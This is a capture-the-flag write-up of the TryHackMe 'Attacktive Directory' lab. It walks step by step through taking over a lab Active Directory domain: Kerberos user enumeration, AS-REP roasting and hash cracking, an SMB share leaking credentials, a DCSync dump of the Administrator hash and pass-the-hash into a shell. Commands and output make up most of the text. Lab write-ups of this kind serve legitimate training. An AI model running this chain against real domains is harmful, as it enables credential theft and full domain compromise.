# **Attacktive Directory - TryHackMe**

*Target Ip. Address: 10.49.157.22*

Let's start with the nmap scan.

```bash
kali@kali:nmap -sV -sC 10.49.157.22
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-23 10:20 +0545
Nmap scan report for 10.49.157.22
Host is up (0.033s latency).
Not shown: 986 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-title: IIS Windows Server
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-02-23 04:36:01Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: spookysec.local, Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2026-02-23T04:36:13+00:00; +1s from scanner time.
| ssl-cert: Subject: commonName=AttacktiveDirectory.spookysec.local
| Not valid before: 2026-02-22T04:31:29
|_Not valid after:  2026-08-24T04:31:29
| rdp-ntlm-info: 
|   Target_Name: THM-AD
|   NetBIOS_Domain_Name: THM-AD
|   NetBIOS_Computer_Name: ATTACKTIVEDIREC
|   DNS_Domain_Name: spookysec.local
|   DNS_Computer_Name: AttacktiveDirectory.spookysec.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-02-23T04:36:05+00:00
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
Service Info: Host: ATTACKTIVEDIREC; OS: Windows; CPE: cpe:/o:microsoft:windows
                                                                                                                                                             
Host script results:                                                                                                                                         
| smb2-time:                                                                                                                                                 
|   date: 2026-02-23T04:36:07                                                                                                                                
|_  start_date: N/A                                                                                                                                          
|_clock-skew: mean: 1s, deviation: 0s, median: 0s                                                                                                            
| smb2-security-mode:                                                                                                                                        
|   3.1.1:                                                                                                                                                   
|_    Message signing enabled and required                                                                                                                   
                                                                                                                                                             
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .                                                               
Nmap done: 1 IP address (1 host up) scanned in 23.91 seconds
```

We have a basic AD services running. Let's update our hosts file.

```bash
kali@kali:cat /etc/hosts                                                                                                                                           
10.49.157.22    AttacktiveDirectory.spookysec.local spookysec.local

127.0.0.1       localhost
127.0.1.1       kali.kali       kali

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouterso
```

Let's start by seeing if we have any shares available for guest logon.

```bash
kali@kali:smbclient -L \\10.49.157.22
Password for [WORKGROUP\kali]:
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.49.157.22 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

It seems as a guest user, we have no shares listing allowed. Let's use kerbrute to find the usernames using the wordlist provided to us.

```bash
kali@kali:kerbrute userenum -d spookysec.local --dc 10.49.157.22 users.txt                                                                                         

    __             __               __     
   / /_____  _____/ /_  _______  __/ /____ 
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/                                        

Version: v1.0.3 (9dad6e1) - 02/23/26 - Ronnie Flathers @ropnop

2026/02/23 10:34:59 >  Using KDC(s):
2026/02/23 10:34:59 >   10.49.157.22:88

2026/02/23 10:34:59 >  [+] VALID USERNAME:       james@spookysec.local
2026/02/23 10:35:00 >  [+] VALID USERNAME:       svc-admin@spookysec.local
2026/02/23 10:35:01 >  [+] VALID USERNAME:       James@spookysec.local
2026/02/23 10:35:01 >  [+] VALID USERNAME:       robin@spookysec.local
2026/02/23 10:35:04 >  [+] VALID USERNAME:       darkstar@spookysec.local
2026/02/23 10:35:06 >  [+] VALID USERNAME:       administrator@spookysec.local
2026/02/23 10:35:10 >  [+] VALID USERNAME:       backup@spookysec.local
2026/02/23 10:35:13 >  [+] VALID USERNAME:       paradox@spookysec.local
2026/02/23 10:35:28 >  [+] VALID USERNAME:       JAMES@spookysec.local
2026/02/23 10:35:33 >  [+] VALID USERNAME:       Robin@spookysec.local
2026/02/23 10:36:02 >  [+] VALID USERNAME:       Administrator@spookysec.local
2026/02/23 10:37:07 >  [+] VALID USERNAME:       Darkstar@spookysec.local
2026/02/23 10:37:25 >  [+] VALID USERNAME:       Paradox@spookysec.local
2026/02/23 10:38:28 >  [+] VALID USERNAME:       DARKSTAR@spookysec.local
2026/02/23 10:38:47 >  [+] VALID USERNAME:       ori@spookysec.local
2026/02/23 10:39:41 >  [+] VALID USERNAME:       ROBIN@spookysec.local
2026/02/23 10:41:20 >  Done! Tested 73317 usernames (16 valid) in 381.182 seconds
```

From here, svc-admin and backup are worth noting, as they are generally high-value targets.

Let's ask for AS-REP hash for svc-admin.

```bash
kali@kali:impacket-GetNPUsers spookysec.local/svc-admin -dc-ip 10.49.157.22 -no-pass                                                                               
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Getting TGT for svc-admin
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:1f4646d.....b64d10
```

That was successful. Now, we can crack the AS-REP hash using john the ripper.

```bash
kali@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 128/128 SSE2 4x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
ma...05   ($krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL)     
1g 0:00:00:11 DONE (2026-02-23 10:39) 0.08726g/s 509364p/s 509364c/s 509364C/s manaia05..mana7510
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

We can RDP as user svc-admin to get the flag.

```bash
kali@kali:xfreerdp3 /u:svc-admin /p:ma...05 /v:10.49.157.22 /d:spookysec.local /dynamic-resolution +clipboard                                               
[10:45:50:911] [9716:000025f4] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[10:45:50:911] [9716:000025f4] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[10:45:50:911] [9716:000025f4] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
```

<img width="1029" height="793" alt="Screenshot 2026-02-23 104651" src="https://github.com/user-attachments/assets/576e4965-4192-46db-8994-5f4c100ea020" />

We have our first flag. Since, we have a valid set of credentials, we can use bloodhound to map out entire AD, so that we can forge our attack path.

```bash
kali@kali:bloodhound-python -u 'svc-admin' -p 'ma...05' -d spookysec.local -ns 10.49.157.22 -c All                                                          
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: spookysec.local
INFO: Getting TGT for user
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: attacktivedirectory.spookysec.local
INFO: Found 18 users
INFO: Found 54 groups
INFO: Found 2 gpos
INFO: Found 3 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: AttacktiveDirectory.spookysec.local
INFO: Done in 00M 09S
```

We have harvested the information about this AD. Now, we can ingest it into bloodhound UI, to analyze attack path.

```bash
kali@kali:sudo neo4j console
[sudo] password for kali: 
Directories in use:
home:         /usr/share/neo4j
config:       /usr/share/neo4j/conf
logs:         /etc/neo4j/logs
.
.
.
```

```bash
kali@kali:bloodhound
[sudo] password for kali: 

 Starting neo4j
Neo4j is running at pid 11541

 Bloodhound will start
.
.
 opening http://127.0.0.1:8080
```

It seems, our current user svc-admin has not much rights, which can help us.

Let's list the shares for our current user to see if we find anything.

```bash
kali@kali:smbclient -L //10.49.157.22/ -U 'spookysec.local\svc-admin%ma...05'

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk      
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.49.157.22 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

We now have a shares. The backup share seems interesting.

```bash
kali@kali:smbclient //10.49.157.22/backup -U 'spookysec.local\svc-admin%ma...05'                                                                            
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun Apr  5 00:53:39 2020
  ..                                  D        0  Sun Apr  5 00:53:39 2020
  backup_credentials.txt              A       48  Sun Apr  5 00:53:53 2020

                8247551 blocks of size 4096. 3590849 blocks available
smb: \> get backup_credentials.txt 
getting file \backup_credentials.txt of size 48 as backup_credentials.txt (0.3 KiloBytes/sec) (average 0.3 KiloBytes/sec)
smb: \> 
```

We have backup credentials. Let's see what it has for us.

```bash
kali@kali:cat backup_credentials.txt                                                                                                                               
YmFj.....ODYw
```
```
kali@kali:echo "YmFj.....ODYw" | base64 -d
backup@spookysec.local:ba...60
```

We have a valid set of credentials for user backup. Let's RDP as user backup and collect our second flag.

```bash
kali@kali:xfreerdp3 /u:backup /p:ba...60 /v:10.49.157.22 /d:spookysec.local /dynamic-resolution +clipboard                                               
[10:59:22:835] [15584:00003ce0] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Using /p is insecure
[10:59:22:835] [15584:00003ce0] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Passing credentials or secrets via command line might expose these in the process list
[10:59:22:835] [15584:00003ce0] [WARN][com.freerdp.client.common.cmdline] - [warn_credential_args]: Consider using one of the following (more secure) alternatives:
```

<img width="1032" height="805" alt="Screenshot 2026-02-23 105958" src="https://github.com/user-attachments/assets/a45635cc-6fdb-411c-be69-7b4ce6a59084" />

Now, that is done. Let's get back to bloodhound to see what this user can do.

<img width="1283" height="947" alt="Screenshot 2026-02-23 105820" src="https://github.com/user-attachments/assets/c3023286-0354-482a-a74e-76332e2f9800" />

This user has GenericAll on domain admin. We can simply get the Admin hash using impacket-secretsdump.

```bash
kali@kali:impacket-secretsdump spookysec.local/backup:'ba...60'@10.49.157.22 -just-dc-user Administrator                                                     
Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e.....fc:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:713955f08a8654fb8f70afe0e24bb50eed14e53c8b2274c0c701ad2948ee0f48
Administrator:aes128-cts-hmac-sha1-96:e9077719bc770aff5d8bfc2d54d226ae
Administrator:des-cbc-md5:2079ce0e5df189ad
[*] Cleaning up... 
```

Now, we have let's login via evil-winrm.

```bash
kali@kali:evil-winrm -i 10.49.157.22 -u Administrator -H 0e.....fc                                                                          
                                        
Evil-WinRM shell v3.9
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
thm-ad\administrator
```

We are inside the domain controller as administrator. Let's end this challenege by reading the final flag.

```bash
*Evil-WinRM* PS C:\Users\Administrator\Desktop> type root.txt
TryHackMe{4c.....3r}
```
